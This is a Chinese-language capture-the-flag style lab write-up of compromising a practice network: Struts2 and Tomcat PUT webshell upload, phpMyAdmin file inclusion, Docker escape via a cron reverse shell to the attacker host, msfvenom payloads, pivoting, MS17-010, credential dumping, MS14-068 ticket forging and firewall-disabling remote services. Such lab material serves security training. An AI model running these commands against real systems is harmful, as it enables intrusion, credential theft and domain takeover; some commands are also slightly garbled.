## 前言

通过前面的靶场三，我们学习了命令执行函数的绕过，脏牛提权以及WMI的利用，靶场四利用的知识点有struts2、tomcatl漏洞利用、phpmyadmin文件包含、docker逃逸、以及MS14-068攻击域孔，下面让我们来看一下吧。

本次试验靶场配置好后，要自己开启vulhub里面的三个漏洞

> 攻击机 192.168.1.3  
> Web 192.168.1.9 192.168.183.3  
> Win7 192.168.183.2  
> DC 192.168.1.130

## 一、信息收集

先对目标进行端口扫描，发现开放了2001、2002、2003 三个web端口

![v2-f1fc8999ca5174d04bedf9bdedba0535_1440w.png](https://image.3001.net/images/20210902/1630547658_61302eca52455a30127ea.png!small)

## 二、漏洞分析

### struts2

访问http://192.168.1.9:2001/doUpload.action发现是struts2，使用漏洞利用工具直接获取shell  
![v2-695778483624741027bd80ea73deccbf_1440w.png](https://image.3001.net/images/20210902/1630547659_61302ecb3df68e39922d5.png!small)

### Tomcat

访问http://192.168.1.9:2001/doUpload.action是一个tomcat页面，首先想的是看有没有弱口令，然后进入后台部署war包来进行getshell，但是不行，那就看看有没有CVE漏洞，使用漏洞扫描工具发现存在CVE-2017-12615,可以直接PUT上传一个shell文件

![v2-0d1452fd5b227c0a3d3c7f7a8232ce17_1440w.png](https://image.3001.net/images/20210902/1630547660_61302ecccd7a42c971d71.png!small)

抓包上传一个冰蝎的木马  
![v2-dbde6f63004f7833649420297bfd6b16_1440w.png](https://image.3001.net/images/20210902/1630547661_61302ecdcbed4b35f00ad.png!small)

访问一下发现存在shell.jsp文件成功上传

![v2-743df18817b985008c06df65e3aa25ee_1440w.png](https://image.3001.net/images/20210902/1630547662_61302ece61326aa6d4952.png!small)

### Phpmyadmin

> 访问http://192.168.1.9:2003/发现是一个phpmyadmin未授权页面

![v2-987062349e9fa744806a5d0eccdbb019_1440w.png](https://image.3001.net/images/20210902/1630547662_61302ece9b39e740269e7.png!small)  
首先想到的是修改日志文件或者直接写入一句话木马，但是没有权限，测试发现存在文件包含漏洞

http://192.168.1.9:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd  
  
![v2-12d71d8506a3976b0e9b89f32eaf8d9c_1440w.png](https://image.3001.net/images/20210902/1630548778_6130332adb693ba26f623.png!small)![v2-c3451871948ecd9efbcffda879a03d17_1440w.png](https://image.3001.net/images/20210902/1630548779_6130332b8e3af6fcf4316.png!small)访问http://192.168.1.9:2003/index.php?target=db_sql.php?w=../../../../../../../../../../tmp/sess_c31ee298e7a539c99516b6e291d5de32  
![v2-47ee75334ac775424037141cc39ca931_1440w.png](https://image.3001.net/images/20210902/1630547663_61302ecfb7902c93c60d9.png!small)

尝试写入一句话，但是工具连接不上，换成GET方式执行命令也不行，但通过执行system函数来执行命令。

## 三、漏洞利用

利用Tomcat以PUT方式上传一个木马文件，使用冰蝎进行连接

![v2-7d949660cc8bfc24b0a53a45a95414a4_1440w.png](https://image.3001.net/images/20210902/1630547665_61302ed1442827f6ed50b.png!small)

docker逃逸

判断是否为docker环境

ls -alh /.dockerenv #查看是否存dockerrnv文件  
cat /proc/1/cgroup #查看系统进程的cgroup信息

挂载宿主机

fdisk -l #查看磁盘文件  
mkdir /chan #新建一个目录用于挂载  
mount /dev/sda1 /chan #将宿主机/dev/sda1目录挂载到容器内  
![v2-af1e9ba7ab7b7240c3cb30bc25110e50_1440w.png](https://image.3001.net/images/20210902/1630547665_61302ed1da29e49b656c0.png!small)

计划任务写入一个反弹shell的脚本

Touch /chan/tmp/test.sh  
Chmod +x /chan/tmp/test.sh  
Ls -l /chan/tmp/test.sh  
echo "/bin/bash -i >& bash -i >& /dev/tcp/192.168.1.3/9999 0>&1" >>
/chan/tmp/test.sh  
cat /chan/tmp/test.sh  
![v2-f3b130763116ea4b01c356beb3ab337c_1440w.png](https://image.3001.net/images/20210902/1630547666_61302ed268e57fa4c305d.png!small)

sed -i '$a*/1 * * * * root bash /tmp/test.sh ' /chan/etc/crontab  
cat /test/etc/crontab

![v2-97d8e3ca1a4be68ec0030e471347e454_1440w.png](https://image.3001.net/images/20210902/1630547667_61302ed3041b89c95f3b0.png!small)  
攻击机监听端口获取shell，逃逸成功，此时也利用计划任务corntab提权到root权限

![v2-df4195af9ef357fc8c1076e1619a3ccb_1440w.png](https://image.3001.net/images/20210902/1630547667_61302ed39aa24fb3f6bee.png!small)

利用python获取一个交互式shell

![v2-947d516105e63437a84fd68090d41314_1440w.png](https://image.3001.net/images/20210902/1630547668_61302ed4115fad352c6bd.png!small)

进行简单的信息收集，发现存在两个网卡，内网IP为192.168.183.3  
![v2-b54ca03cab4286ba2dd2ebd8acab5315_1440w.png](https://image.3001.net/images/20210902/1630547669_61302ed545a38a46007fc.png!small)

使用msf生产一个shell.elf

msfvenom -p

linux/x64/meterpreter/reverse_tcp

lhost=192.168.1.3 lport=4444-f elf >

shell.elf  
![v2-198166a8355e324d6098ed73b09b9125_1440w.png](https://image.3001.net/images/20210902/1630547670_61302ed6e6a7fa503af94.png!small)

在靶机中将shell.elf下载下来赋权并执行

![v2-cce19fb6c33a804260bbaaa3d98a76ad_1440w.png](https://image.3001.net/images/20210902/1630547671_61302ed7987ad4c3621fd.png!small)

MSF监听4444端口，成功获得一个meterpreter

## 四、横向渗透

添加路由，然后使用MSF开个sock4正向代理，配合proxychains  
![v2-45a274f44fa97fa07d4301cd36bdfa6f_1440w.png](https://image.3001.net/images/20210902/1630548780_6130332c603cb2cff22e5.png!small)![v2-25cbd770139ac3ead5c0377a243ca973_1440w.png](https://image.3001.net/images/20210902/1630548781_6130332d3962969f0891f.png!small)

将/etc/proxychains.conf配置文件中的端口改为1080

![v2-5db0e0269ee0a6fccb4df2a9134bee82_1440w.png](https://image.3001.net/images/20210902/1630547672_61302ed878ec5d9cbeaa7.png!small)  
配置好后访问内网地址，发现成功访问说明配置成功  
  
![v2-addf32b51af9f4b7ef007c8e73153437_1440w.png](https://image.3001.net/images/20210902/1630547672_61302ed8ce292b9472323.png!small)

### 内网存活主机扫描

利用MSF自带的模块进行内网主机存活扫描  
![v2-42c2de5a9127da78c71e5346855c1578_1440w.png](https://image.3001.net/images/20210902/1630548782_6130332e702eeb0ac83df.png!small)![v2-8bc1ff376e8f2d11fe8f51776e67f2b1_1440w.png](https://image.3001.net/images/20210902/1630548782_6130332eb991b74088cf2.png!small)或者在靶机中执行下述命令

for k in $( seq 1 255);do ping -c 1 192.168.183.$k|grep "ttl"|awk -F "[ :]+"
'{print $4}'; done  
![v2-e07dfe25a2ed08cc3fc95941565882a7_1440w.png](https://image.3001.net/images/20210902/1630547673_61302ed9a5b6955e314ea.png!small)

### 端口服务探测

proxychains4 nmap -sT -Pn -p 21,22,135,139,445,80,53,8080,1433 192.168.183.2  
proxychains4 nmap -sT -Pn -p 21,22,135,139,445,80,53,8080,1433 192.168.183.130  
![v2-a88314429458c2ef7092e77d73b695ec_1440w.png](https://image.3001.net/images/20210902/1630548783_6130332f7bd137f71ac27.png!small)

![v2-61868fcf78ac359af0fb4db113fdcd41_1440w.png](https://image.3001.net/images/20210902/1630548784_613033307d6603f282e00.png!small)

发现主机开启了445端口，利用ms17-010攻击域内主机，这里创建一个正向的shell  
![v2-e0c13eb904cf2d46db94b8af2fd03ff6_1440w.png](https://image.3001.net/images/20210902/1630547674_61302eda2a357c9f6caa9.png!small)

攻击成功，成功获取一个meterpreter,  
![v2-876aee201b7c2f97727d13dae472978c_1440w.png](https://image.3001.net/images/20210902/1630547675_61302edbe4c4fd126d750.png!small)

使用tasklist /v查看进程发现存在DEMO域成员进程，尝试抓取其密码

![v2-616bf0deab2d02229331425eb7f064be_1440w.png](https://image.3001.net/images/20210902/1630547676_61302edc94a58b2a5e0f1.png!small)

成功抓取到douser域用户的密码  
![v2-72545e28d268c7850a0840cfb71913af_1440w.png](https://image.3001.net/images/20210902/1630547677_61302edd35d40e1dd7968.png!small)

切换到域用户

![v2-4ca9fb348a7c4e114d0b83ccd785d3d5_1440w.png](https://image.3001.net/images/20210902/1630547678_61302ede6ec33934eceb3.png!small)

进行简单域信息收集  
![v2-ab5cf2d0acebd78db93792c55507bd69_1440w.png](https://image.3001.net/images/20210902/1630547678_61302edef2fd366102dab.png!small)

利用MS14-048攻击域控

获取域用户douser的SID

![v2-bc7e48aeb7ebd4c6ffc11943f89b0ef5_1440w.png](https://image.3001.net/images/20210902/1630547679_61302edf894528d3638d0.png!small)  
返回system权限，使用MS14-068进行攻击![v2-33dc7b04baa2f8a4ed266cba1930ce1f_1440w.png](https://image.3001.net/images/20210902/1630547680_61302ee0e884e33614b42.png!small)

### 利用ms14-068生成票据：

MS14-068.exe -u douser@demo.com -p Dotest123 -s  
S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130  
  
![v2-fb2ff6a63492e35d3eda46bb1fb99e5c_1440w.png](https://image.3001.net/images/20210902/1630547681_61302ee17bb8674e019d6.png!small)

### 在mimikztz中导入票据：

Kerberos::ptc C:\Users\douser\Desktop\TGT_douser@demo.com.ccache

![v2-7edfc317e0f6a347ac8d086611f8da48_1440w.png](https://image.3001.net/images/20210902/1630547682_61302ee2112f7e94eeefe.png!small)  
成功获取域控权限  
![v2-65bad473600ea1d33dc79fec33c61c83_1440w.png](https://image.3001.net/images/20210902/1630547683_61302ee3162c0baa36add.png!small)

利用MSF生产一个正向连接的payload

msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f exe
-o/var/www/html/cahn.exe

将chan.exe上传到跳板机上

![v2-3b005a9fa8c068e1e8140d15e11e52b8_1440w.png](https://image.3001.net/images/20210902/1630547683_61302ee3d5a6e7767cec4.png!small)

然后将chan.exe复制到域控上  
![v2-30d2066cdd2f9d643a4db0aacbcc40bd_1440w.png](https://image.3001.net/images/20210902/1630547684_61302ee4a69901d00cfa1.png!small)

创建关闭域控的防火墙和执行chan.exe的服务，然后执行

sc \\\WIN-ENS2VR5TR3N create ProFirewall binpath= "netsh advfirewall set
allprofiles state off"  
sc \\\WIN-ENS2VR5TR3N start ProFirewall  
sc \\\WIN-ENS2VR5TR3N create Startup binpath= "C:\chan.exe"  
sc \\\WIN-ENS2VR5TR3N start Startup  
![v2-60c46cbcfaf47e4a8760fe17ca5ca199_1440w.png](https://image.3001.net/images/20210902/1630547685_61302ee56e5e644e161f5.png!small)

在MSF设置监听，获取一个meterpreter，但是这里过了一会，会自动断开，所以我迁移了一个进程  
![v2-81de83c20ae82fe6ad744ad0ac106a1c_1440w.png](https://image.3001.net/images/20210902/1630547686_61302ee6d3b374f5af479.png!small)

抓取域控管理员的密码  
![v2-47181bdd19112b0323f6fda672720b7a_1440w.png](https://image.3001.net/images/20210902/1630547687_61302ee7bd65d39d03eac.png!small)

后面就是开启3389端口然后进行桌面连接了

run post/windows/manage/enable_rdp

或者

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server/v
fDenyTSConnections /t REG_DWORD /d 0 /f

![v2-0a361825933ed2e5035de96118c463c5_1440w.png](https://image.3001.net/images/20210902/1630547689_61302ee924a27fb4d6d88.png!small)

## 总结

学习了docker逃逸的姿势，在搭建好代理对内网主机使用MS17010进行攻击时，由于网络的原因好几次都是攻击成功，但是无法返回一个meterpreter。在靶机中查看端口，发现监听的端口过了一会会自动断开，好在后面还是成功返回了一个meterpreter
，然后利用MS14-068拿下域控。

